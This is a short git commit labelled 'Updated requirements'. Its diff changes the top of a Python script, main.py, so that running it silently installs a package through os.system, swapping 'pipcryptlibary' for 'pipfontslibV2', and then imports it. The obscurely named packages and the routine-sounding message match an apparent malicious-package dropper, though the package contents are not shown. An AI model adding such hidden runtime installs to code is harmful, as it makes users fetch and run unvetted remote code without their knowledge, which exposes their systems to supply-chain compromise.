0c08b3ce1a987846d78b66fb6dcdda6a8f6b0070
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-09 00:22:48 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptlibary")
-import pipcryptlibary
+os.system("pip install pipfontslibV2")
+import pipfontslibV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
